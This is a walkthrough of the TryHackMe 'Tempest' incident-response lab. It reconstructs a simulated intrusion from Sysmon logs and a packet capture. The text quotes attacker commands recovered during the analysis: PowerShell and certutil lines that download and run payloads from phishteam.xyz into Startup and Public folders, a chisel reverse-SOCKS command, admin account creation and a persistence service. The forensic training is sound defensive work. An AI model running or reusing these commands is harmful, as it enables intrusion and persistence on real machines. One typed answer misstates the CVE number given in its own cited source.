> ### What is the SHA256 hash of the capture.pcapng file?

If we scroll up a wee bit we can see the command we need: `Get-FileHash -Algorithm SHA256 .\capture.pcapng` set as an example. **Get-FileHash** is a PowerShell cmdlet that computes a cryptographic hash for a file. We can use that to determine the hash values for the 3 files we are looking at.

We can also use **certutil** for this task with `certutil.exe -hashfile .\capture.pcapng SHA256` as an example.

**Note:** **certutil** will output in lowercase letters by default it seems.

> ### What is the SHA256 hash of the sysmon.evtx file?

We can follow along and use the `Get-FileHash` cmdlet as this seems to work pretty well.

**Tempest Incident**

**In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.**

> ### The user of this machine was compromised by a malicious document. What is the file name of the document?

Looking at the information given to us we know that the file is a **.doc** file and it was downloaded with **chrome.exe.**

I thought I would have a look at Sysmon View for this. We can open the `windows.evtx` file and then use Event Viewer to **Save All Events As…** as an **.xml** file. This will allow us to open the events in **Sysmon View**.

![Flowchart depicting events from Sysmon View, showing entries for process creation, file creation, and DNS queries associated with "chrome.exe" and "explorer.exe". Includes detailed timestamps, file paths, and error codes.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755178156814/6c5c85e3-b1b5-44ef-9e3a-2e10ecc601b0.png align="center")

To see the same information in the screenshot above by opening the **.xml** file we just generated in **Sysmon View**. Then look for **chrome.exe** on the left, click, then click the **Image Path** then click on the **Sessions (GUIDs)**. You can click on multiple items.

It’s an interesting way of visualizing data, what we are looking at here in the node in the bottom right corner. We see **File Stream Created** and under that a particular looking **<s>.doc</s>** file.

**\= free\_magicules.doc**

I’ve worked more with **Timeline Explorer** so for the purposes of the rest of the exercise I am going to be using that although it’s always interesting to use both pieces of software as you can see how data is connected in 2 different ways, might be easier to visualize.

![Screenshot of Timeline Explorer v2.0.0.1 displaying a list of Sysmon events. Columns include Line, Tag, Record Number, Event Record ID, Time Created, Level, Provider, Channel, Process ID, Computer, and User ID. The table is partially filled with event data. A search bar at the top right has ".doc" entered, and a small thumbnail of the window is visible in the bottom left.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755180018420/c5b4f211-9858-49a6-b9d0-bb2ebd47530d.png align="center")

Again THM have kindly laid out all the shortcuts we need on the taskbar.

Open **Timeline Explorer**, File &gt; Open &gt; **sysmon.csv**.

At the find box at the top right, I filtered with “**.doc**”.

We find multiple results for “.doc” all pointing to **free\_magicules.doc**

---

> ### What is the name of the compromised user and machine?

Looking at this **Process creation** entry we see: **Tempest/benimaru**

![A screenshot of the Timeline Explorer v2.0.0.1 software displaying a CSV file named "sysmon.csv." The columns shown include Event ID, Map Description, and User Name with various entries such as "FileCreateStreamHash" and "Process creation."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755181188632/9cc51744-717d-4424-b367-ce924453d5cb.png align="center")

**\= benimaru-tempest**

---

> ### What is the PID of the Microsoft Word process that opened the malicious document?

In the **Executable Info** for this event (scroll a lot to the right) we see:

`"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\benimaru\Downloads\free_magicules.doc" /o ""`

Confirming that this is the event we need in relation to Microsoft Word.

Scrolling a lot to the left we will find under **Payload Data1** that **ProcessID** is **496**.

**\= 496**

---

> ### Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

Make sure to first delete the “.doc” filter in the top right corner (easily forgotten about).

Seeing as we are looking at resolved domains, it makes sense to look at **Sysmon Event ID 22**. This is for **DNSEvents** (DNS Queries). We can have a look and see if Microsoft Word is trying to reach to any domains.

Under **Event Id** type in **22** and under **Payload Data1** type in **Process ID: 496** as we know this is **WINWORD.exe** and we know that **Event ID 22** is for looking up domains.

![A screenshot of the Timeline Explorer v2.0.0.1 interface displaying a file named sysmon.csv. The data table shows columns such as "ad Data2," "Payload Data3," "Payload Data4," and others, with entries including file paths and query names like "officecdn.microsoft.com.edgesuite.net" and "augloop.office.com." Query status and results are also listed.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755183788587/2e569434-61d7-4b50-ad94-d553b70557a4.png align="center")

**phishteam.xyz** has my attention and we should take note of it. In **Payload Data6** we can see the **QueryResults:**. I think it shows the **IPv6** and **IPv4** results for **phishteam.xyz**. Specifically we want the **IPv4** address in this scenario.

We can double click on the cell and copy it’s contents.

**\= 167.71.199.191**

---

> ### What is the base64 encoded string in the malicious payload executed by the document?

So for this one we are looking at Sysmon Event ID 1 for process creation. We can replace our **22** with **1** in the appropriate box. Now we know the document inside Microsoft Word has a PID of **496**. Using that in the appropriate **Payload Data** box doesn’t reveal what we want. However we can also look at Microsoft Word as the **Parent Process** and see if it spawns anymore processes where we might be able to spot a base64 encoded string.

**Tip:** Looking at **Payload Data5** we can see all our **Parent Processes**, clicking on the tiny little symbol at the top right that looks like a wee cocktail glass shows us all the results. We can then click on the 2 entries for Parent Process: **496**.

![A software interface of "Timeline Explorer" version 2.0.0.1 displaying a CSV file named "sysmon.csv." Visible data includes parent process details with IDs and GUIDs. A text filter pane is open, listing multiple parent process entries with checkboxes.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755184588012/aefbfffc-1792-4882-bbfd-4edc9a572528.png align="center")

We can scroll a little to the right where we will find “Executable Info” and the bottom entry sure looks juicy.

![A screenshot of Timeline Explorer v2.0.0.1 displaying a table with columns for Executable Info and Source File. It shows paths of Microsoft and SysWOW64 executables from sysmon.csv.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755184729157/b6d70b1c-6c1a-440a-a09c-99579dfaa77f.png align="center")

Simply copy and paste the Base64 encoded string! It’s the literal single quotation marks and has a little padding (**\==**) at the end.

> ### What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

Here a wee hint from THM:

*“External research needed. Observe the parent-child relationship of Winword.exe and the process that executed the malicious base64 payload”*

Looking at that exact entry where we got our Base64 encoded string we can see the process that executed this was **C:\\Windows\\SysWOW64\\msdt.exe**.

I just googled `msdt.exe winword.exe CVE` and the first results was exactly what I was looking for!

Brought me here: [https://msrc.microsoft.com/blog/2022/05/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/](https://msrc.microsoft.com/blog/2022/05/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/)

“**Guidance for CVE-2022-30190”**

**\= 2022-301190**

---

> ### The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

Here is the hint from THM: *“The AppData environment variable can be simplified.”*

Reading the description for this task I took the base64 encoded string we found earlier and put it into Cyberchef: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

This is the result:

```yaml
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

We can see that it’s navigating to the Startup folder to make this more persistent. We can see **iwr** being used here or **Invoke Web Request**. We are downloading a file, specifically - `http://phishteam.xyz/02dcf07/update.zip`, unzipping then promptly deleting the zip file to cover up tracks a bit.

Seeing as we have the **update.zip** information, I looked it up in Timeline Explorer.

![A screenshot of Timeline Explorer v2.0.0.1 displaying a CSV file. A section showing "TargetFilename" highlights the path: "C:sersenimaruppDataoamingicrosoftindowstart Menurogramstartuppdate.zip."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755254136123/0857a0db-084d-47a3-be4e-cb268f9ef914.png align="center")

Found one entry and under **Payload Data4** we can see our **TargetFilename:**

**\= C:\\Users\\benimaru\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\**[**update.zip**](http://update.zip)

---

> ### The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

Seeing as we have found the **phishteam.xyz** domain, I decided that would be a good place to look.

Doing so will reveal some DNS results and some more juicier details:

![A Timeline Explorer window showing search results for "phishteam.xyz" within a CSV file. Several entries display PowerShell commands downloading and executing files from the specified URL, highlighted in orange. The interface includes options like File, Tools, Tabs, View, and Help in the menu bar.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755254992675/03c5caec-1a46-4191-b173-ed662cb633d7.png align="center")

We can see some very suspicious **.exe** files, however the one we want to look at here is **first.exe**. Copy the **Executable Info** and remove the quotations around the **powershell.exe** part.

**\= C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -noni certutil -urlcache -split -f '**[**http://phishteam.xyz/02dcf07/first.exe**](http://phishteam.xyz/02dcf07/first.exe)**' C:\\Users\\Public\\Downloads\\first.exe; C:\\Users\\Public\\Downloads\\first.exe**

---

> ### Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

Using information we already know, I looked up `first.exe`.

![A screenshot of Timeline Explorer software displaying search results for "first.exe" in sysmon.csv. The results show various command lines involving file paths and network activities, with "first.exe" highlighted several times.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755255422726/c4df9f55-8386-4a46-85b3-07114b24f983.png align="center")

Looking at this entry with **Executable Info” of “C:\\Users\\Public\\Downloads\\first.exe**

Scrolling a bunch to the left under **Payload Data3** we will find MD5, SHA256 and IMPHASH values. Looking at our entry and the SHA256 part we find our hash value!

**\= CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8**

---

> ### The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

The answer here isn’t `phishteam.xyz`, that one seems to be used to download the needed files. We are looking for another server, the c2 server. A rather simple and crude method might be to just lookup more **.xyz** domains as the adversaries here seem to enjoy using them.

If doing so will actually reveal another domain under **Payload Data4**.

A smarter way of looking up this information might be via DNS instead. We know that there is a domain that needs resolved here so lets use Sysmon Event ID 22 for this task.

Heading over the **Event ID** we can plomp in **22**.

Back over the **Payload Data4** we see all the domains being resolved by the host. Including one with a fair few requests…

![Screenshot of Timeline Explorer v2.0.0.1 showing a list of file paths and query details. The interface includes multiple tabs at the top, with columns labeled "Payload Data4" and "Payload Data5." The data includes entries with file paths like "Microsoft OneDriveneDrive.exe" and query names such as "onedriveclucproddm20002.blob.core.windows.net." Each entry has a "QueryStatus" of 0.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755256187238/6a1bcb1a-0942-4d6e-9454-38a4bd281061.png align="center")

**Tip:** Filtering with **.xyz** and using Event ID: **22** will give us 2 results.

**\=** [**resolvecyber.xyz**](http://resolvecyber.xyz)**:80**

---

> ### What is the URL of the malicious payload embedded in the document?

Well we know that **phishteam.xyz** and **resolvecyber.xyz** are up to no good. It looks to me that the **resolvecyber.xyz** domain is the **C2** and **phishteam.xyz** is a file server for downloads.

Lets open up the **capture.pcapng** file in Wireshark and have a closer look.

If we use:

```yaml
http.host matches "phishteam.xyz"
```

as a search filter in Wireshark we will find a bunch of results.

![Screenshot of a Wireshark capture file showing network packets filtered by the expression "http.host matches 'phishteam.xyz'". Rows display details such as packet number, time, source, destination IP addresses, protocol (HTTP), packet length, and information about HTTP requests.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755257086138/dc410f3d-1869-47d9-951d-923674e5ddf9.png align="center")

We can see some of suspicious files again along with the index.html file where they came from under a random directory: **02dcf07**

**\=** [**http://phishteam.xyz/02dcf07/index.html**](http://phishteam.xyz/02dcf07/index.html)

---

> ### What is the encoding used by the attacker on the c2 connection?

This time looking at the **C2** server **resolvecyber.xyz** we see a lot of traffic of what looks like **base64** encoded strings:

![A screenshot of Wireshark displaying network packets filtered by the host "resolvecyber.xyz." It shows HTTP GET requests from the source IP "192.168.254.107" to the destination "167.71.222.162." The selected packet is highlighted, showing details of the HTTP request and response in the lower pane.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755264728203/18eb6afc-eca8-49a9-a230-f347cc4d645b.png align="center")

There are **GET** requests to **167.71.222.162**. These requests are trying to make queries encoded in **base64** at a directory called **9ab62b5.** These queries are using **GET** requests to send information to the **C2** by enclosing the **base64** encoded strings in segments within the queries themselves.

A pretty clever way to send data by acting like it’s trying to receive information. Using the request itself.

“I want a cup of milk”, also means “I am letting you know about the milk I want”. To receive we must also send.

**\= base64**

---

> ### The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

I referred to these as queries, partly because if we inspect one of the packets:

```yaml
Frame 5566: 264 bytes on wire (2112 bits), 264 bytes captured (2112 bits) on interface \Device\NPF_{79F1317E-A1C6-4B81-B4C8-AC13A41243C9}, id 0

    [HTTP request 1/1]
    [Response in frame: 5569]
```

We see the **GET** request, the directory **/9ab62b5** and **?q=**.

**q** is the variable that holds the base64 encoded string.

**\= q**

---

> ### The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

We looked at the **GET** request, the **directory**/**URL** and the **q** variable.

We know it’s under the **/9ab62b5 URL**

**\= 9ab62b5**

---

> ### What is the HTTP method used by the binary?

Again looking at the all the information we have so far, we know it’s a **GET** request

**\= GET**

---

> ### Based on the user agent, what programming language was used by the attacker to compile the binary?

Looking back at packet we are inspecting we see **user-agent: Nim httpclient/1.6.6\\r\\n**

**\= nim**

---

> ### The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

With:

```yaml
http.host matches "resolvecyber.xyz"
```

still being filtered in Wireshark we can see all these segmented **base64** encoded strings. The answer we are looking for is in one of these strings.

This is how I found the piece of the puzzle that we are looking for:

I right clicked on the first **GET** request with **base64** encoded string and clicked **Follow** &gt; **TCP Stream.**

These brings me here:

![Screenshot of a Wireshark capture showing a list of network packets. The highlighted packet is an HTTP GET request to "resolvecyber.xyz" with a "200 OK" response in the follow TCP stream window below. User-agent is "Nim httpclient/1.6.6".](https://cdn.hashnode.com/res/hashnode/image/upload/v1755270352332/673a8039-2322-4917-a9af-9f0b10dd3572.png align="center")

What I did from here is simply go through the **Streams**. You can see at the bottom right there is the word **Stream** and next to that **138**. If you click the little arrow up you can work through the traffic streams.

You can see the outbound traffic with the **GET** request and the response from the server giving a **200 OK.**

Going through the Streams can take some time, what we are focusing on is the big juicy GET requests, remembering that these is actually the ex-filtrated data being sent out.

We copy the base64 strings and pop them into CyberChef to be decoded.

![Screenshot of an online Base64 decoder tool. The interface includes sections labeled "Recipe," "Input," and "Output." The input contains encoded Base64 text, and the output shows decoded PowerShell script with user and password credentials. The interface has various buttons and options for interacting with the data.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755271005490/9ab47198-06b9-4151-b566-b9856f6ba4a1.png align="center")

Above is the correct packet we need, specifically **Packet 5893** and **Stream 160.**

We can a variable called **$pass** which looks interesting.

I realize this might not be the easiest or sleekest way of going about find this information.

The other option you have at hand is to use **Tshark**, and create an awesome command that will take all these **base64** strings and stitch them all together to create one large juicy master **base64** encoded string. Then you can go ahead and decode it in terminal or bring it over to **CyberChef** to continue working on it. There are definitely Write-ups out there that have this feature, I managed to get it working but it is fiddly and can be tricky to setup. Once it’s setup it’s very nice. Sometimes I go about these things doing it a little slower and clunkier (manually), I still get the answer I need but not as fast. If you factor in getting the Tshark commands correct, I may be coming out of this quicker, many ways to achieve this though!

> ### The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

While we are still following the **TCP Stream** we can go up a few until we reach a juicy result:

![Screenshot of Wireshark with a TCP stream displayed. The upper section shows a list of captured packets with details such as time, source, destination, protocol, length, and info. The lower section reveals a follow TCP stream window containing a GET request displaying encoded data and HTTP response details.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755271720613/8f8090fb-32ee-4a57-aee8-5faf82c0ac4b.png align="center")

Specifically **Packet 5919** and **Stream 162.**

Let’s put that bad boy in CyberChef

![Screenshot of a Base64 decoding tool with an input and output section. The input section contains encoded text, and the output shows a list of network connections from a  command, detailing protocol, local and foreign addresses, connection states, and process IDs.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755271833408/34c4e5d2-62d5-4cbd-a9a1-6a9f5070deb4.png align="center")

We know that we are looking for a 4 digit port so that narrow’s down the results.

Having a cheeky Google of the 4 ports that we are looking at brings some interesting results for port **5985**

This is for **winrm** (Microsoft Windows Remote Management).

> ### The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

We are already on Stream 162 so I just went up one to Stream 163 and found a base64 string received that could well be a command being run.

You know what’s coming next, back to CyberChef!

![Screenshot of a Base64 decoding process. The input field contains a Base64 string, and the output field shows a PowerShell command to download a file named "ch.exe" from a URL to a specified location on a computer.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755272847801/07a72c75-4b0a-4ca1-8a31-1715070adca7.png align="center")

We see a **powershell** command to download a sketchy looking **.exe** called **ch.exe**.

I decided to head back into **Timeline Explorer** and look for this **ch.exe.**

![Screenshot of the Timeline Explorer v2.0.0.1 interface displaying data from a CSV file. The highlighted term is "ch.exe," shown in various file paths and PowerShell commands. An additional window at the bottom shows more detailed file path information.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755273074645/e118edfb-674d-438c-b878-32c1abfd23cb.png align="center")

Indeed in **Executable Info** we find what looks like a reverse socks proxy: **client 167.71.199.191:8080 R:socks**

**\= C:\\Users\\benimaru\\Downloads\\ch.exe client 167.71.199.191:8080 R:socks**

---

> ### What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

If we continue looking at this event but scroll a bit to the left under **Payload Data3** we will find the 3 hash values of **ch.exe**

Looking at **SHA256** we find the answer.

**\= 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451**

---

> ### What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.

There is a THM hint: *“External research needed. Use the SHA256 hash to determine the name of the tool.”*

We can take our copied **SHA256** hash and inspect it on **VirusTotal.com**.

![Screenshot of a security analysis showing a file flagged as malicious by 56 out of 72 vendors. The file is identified as "chisel.exe" with a size of 7.85 MB. Common threat labels include hacktool, trojan, and the community score is -54.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755273547000/6c1e30af-d79a-4598-8d07-f8437715cd81.png align="center")

Under **Family labels** we see **chisel**, **hack** and **htool.**

The want we want is the former.

**\= chisel**

---

> ### The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

THM hint: *“External research needed. Use the process name to determine the service name.”*

We already identified the open port of **5985** attached to the **winrm** service

**\= winrm**

---

> ### After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

We know there was another binary downloaded shortly after **ch.exe**.

Heading back into **Wireshark** let’s have a look at our file download server **phishteam.xyz**

![Screenshot of a Wireshark network analysis displaying multiple HTTP requests. The table shows details such as time, source, destination, protocol, length, and info. The highlighted lines indicate requests to a domain, "phishteam.xyz," with various files being accessed.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755274356910/c2b68c47-8afd-4bb8-b606-913a61532eab.png align="center")

Among the files downloaded we find **spf.exe**. We can take that info, head back into **Timeline Explorer** and search for it.

The cell with **Executable Info** of `"C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe` is the one we are looking at. Scroll to the left and look under **Payload Data3** to find the **SHA256** hash.

**\= 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D**

---

> ### Based on the SHA256 hash of the binary, what is the name of the tool used?

Taking that same **SHA256** hash we can paste it in to **VirusTotal** to see what comes up.

![Screenshot of a virus scan result. PrintSpoofer.exe is identified as malicious by 58 out of 72 security vendors. Threat labels include "trojan" and "hacktool". The file details show a size of 26.50 KB, and the analysis was conducted 9 hours ago.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755274680265/099ea2f2-0b48-4df1-a03f-9b5671f79ad0.png align="center")

Under **Family labels** we see what we are looking for.

**\= printspoofer**

---

> ### The tool exploits a specific privilege owned by the user. What is the name of the privilege?

THM Hint: *“External research needed. Read about the tool to see the privilege being abused.”*

We know it’s known as **printspoofer** so I did a quick **Google** and the first result was a **github** page: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

The literal first line tells how it abuses a certain privilege on Windows 10 and Server.

**\= SeImpersonatePrivilege**

---

> ### Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

It only makes sense to head back into **Wireshark** and look at the next binary being downloaded.

![A screenshot of Wireshark capturing HTTP packets filtered by the host "phishteam.xyz". The list shows various HTTP GET and HEAD requests with details like source, destination, protocol, and length. The bottom pane displays packet details for a selected request involving "final.exe".](https://cdn.hashnode.com/res/hashnode/image/upload/v1755275368199/610ec095-8749-43b4-9228-f1b3c5c3aa3c.png align="center")

We can see **final.exe**, looking at **final.exe** in **Timeline Explorer** shows a bunch of internet traffic.

**\= final.exe**

---

> ### The binary connects to a different port from the first c2 connection. What is the port used?

Into **Wireshark** for this one with filter

```yaml
http.host matches "resolvecyber.xyz"
```

to look at the C2 traffic again.

We can click on a packet, then on the middle pane under **Transmission Control Protocol** we can look at **Destination Port: 80** and **Apply as Column** so see all traffic with it’s destination port which will make things a little easier.

![A screenshot of Wireshark displaying network packet details. The context menu is open, showing options like "Apply as Column" highlighted. The packets are listed with columns for number, time, source, destination, protocol, length, and info.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755276005446/83b499f6-a7c2-4121-9854-50f92eea2fe2.png align="center")

Scroll down a bit and we can the traffic changes a little. We go from using **Destination Port:80** to **Destination Port: 8080**.

![Network packet capture displayed in Wireshark. The table shows multiple HTTP requests from source IP 192.168.254.107 to destination IP 167.71.222.162 on port 8080.

**\= 8080**

> ### Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

I didn’t find a super elegant way of filtering for this, only to do some basic filtering and find results manually.

We know we are looking at **SYSTEM** access, so let’s start filtering with **NT AUTHORITY/SYSTEM.**

![A screenshot of the Timeline Explorer software interface, version 2.0.0.1, displaying a list of process creation events with user name "NT AUTHORITYYSTEM". There's a filter panel on the right, showing a list of user names with "NT AUTHORITYYSTEM" selected.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755519939509/2a56068b-c534-4d6f-ad78-551c1f4be014.png align="center")

We can also do a bit more filtering by looking Sysmon Event ID **1** (process creation).

![A screenshot of Timeline Explorer version 2.0.0.1 displaying a detailed table of system events. The table includes columns like Line, Tag, Record Number, Event Record ID, Time Created, Level, Provider, Channel, Process ID, Computer, and User ID. A filter menu is open, showing options to search and select values for the Level column.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755520041523/f061a1a6-27f7-4465-b843-a149eda203ee.png align="center")

That will bring our results down a fair bit. Looking a bit deeper we will find:

![Screenshot of Timeline Explorer displaying CSV data from a file named sysmon.csv. The data includes columns labeled Data4, Payload Data5, Payload Data6, and Executable Info, showing various system command lines and executable paths.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755520211696/ebafa9c3-a0f1-4fb5-882d-e0a6a6fdacce.png align="center")

We can actually filter further if we search for **user /add** at the top right.

![A screenshot of the Timeline Explorer v2.0.0.1 interface showing filtered search results for "user /add" in 'sysmon.csv'. Several command lines are highlighted, involving the addition of users in the Windows system32 directory using "net.exe". Users and groups being added include "shuna" and "shion".](https://cdn.hashnode.com/res/hashnode/image/upload/v1755520265679/0e7051c0-36bb-4425-928e-4f4262140312.png align="center")

**\= shion, shuna**

---

> ### Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

We already know this but if we filter with **user** at the top right, it might be a littler easier to see

![A screenshot of Timeline Explorer v2.0.0.1 displaying a CSV file, "sysmon.csv," with columns titled "Data4," "Payload Data5," "Payload Data6," and "Executable Info." The data includes various processes, parent process IDs, command lines, and user-related activities, with highlighted terms in orange such as "user" and specific usernames.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755520436624/d245aa1c-3a49-4845-a926-c514c833ae8b.png align="center")

We can see the adversary tried to add a user but failed to do so. They later succeeded with adding **/add** to the command.

**\= /add**

---

> ### Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

Here’s the hint from THM: *“External research needed. Find out what event ID logs successful account creation.”*

I just Googled **windows event id account creation**

First result gives me **4720**

**\= 4720**

---

> ### The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

We can use all our previous filters here: Event ID = **1**, User Name = **NT AUTHORITY/SYSTEM,** Search = **user /add.**

![Screenshot of the Timeline Explorer application displaying a CSV file named "sysmon.csv". It shows columns for Data3, Payload Data4, and Executable Info, listing command executions such as adding users and groups via "net.exe". Specific commands like "user /add shuna princess" and "localgroup administrators /add shion" are highlighted.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755521439827/25c9f512-a004-4b49-bc02-554e24505a81.png align="center")

The formatting here is important.

**\= net localgroup administrators /add shion**

---

> ### Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

I went about this a couple of different ways.

First was a bit manual.

Opening the **windows.csv** file in **Timeline Explorer** that I have previously used (the file can be generated just like the sysmon.csv file).

We can look at the **Map Description** section and just browse around.

![Screenshot of the Timeline Explorer application showing a CSV file with entries detailing user account activities, like account creation and group membership changes. The "Map Description" column includes phrases such as "A new account was created" and "A member was added to a security-enabled local group." The "User Name" column lists "WORKGROUPEMPEST$."](https://cdn.hashnode.com/res/hashnode/image/upload/v1755522082468/1d83e63b-759f-4d3e-b3b1-68499af7474b.png align="center")

This one caught my eye. Scrolling to the left we can see it’s Event ID **4732.**

Another way is just a Google job, I just searched for **member added to admin group windows event id** and first result did the trick.

**\= 4732**

---

> ### After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

For this I looked about in a manual sense again, looking into the **Executable Info** as we know this is a command executed.

After a bit of looking I found:

![A screenshot of Timeline Explorer version 2.0.0.1 displaying a log file with columns titled "Executable Info" and "Source File". The highlighted entry shows a command for creating a service named "TempestUpdate" with a binary path to "C:rogramDatainal.exe". Various IP addresses are listed in preceding columns.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755522650663/0c23b1ab-c4e0-4692-a639-42119fb44283.png align="center")

The **start= auto** makes it look suspicious and persistent.

Looking then at the event, we know it Event ID = **1** and looking back previously it’s likely that whatever is going on near the end of this exercise has something to do with **final.exe**.

![A screenshot of Timeline Explorer showing a list of executable processes. The term "final.exe" is highlighted multiple times, indicating its repeated occurrence in the logs. The interface includes columns such as Executable Info and Source File.](https://cdn.hashnode.com/res/hashnode/image/upload/v1755522823317/7adb6113-b8d1-41c3-b6da-dae1e0477f07.png align="center")

That brings it down a bit.

\= **C:\\Windows\\system32\\sc.exe \\TEMPEST create TempestUpdate binpath= C:\\ProgramData\\final.exe start= auto**

We can see the adversary is targeting the **TEMPEST** machine and creating a new service called **TempestUpdate**, then defining the binary used as the **final.exe** executable, then finishing it off with some persistence making it run on startup with **start= auto**.

---

Well done! We made it! This is to date (18.08.25) my longest write-up, so juicy! I am hoping to refine my writing and bring more write-ups soon.

As for the exercise itself, we got more familiar with Event ID’s, Timeline Explorer, filtering and understanding how an adversary might use different techniques.
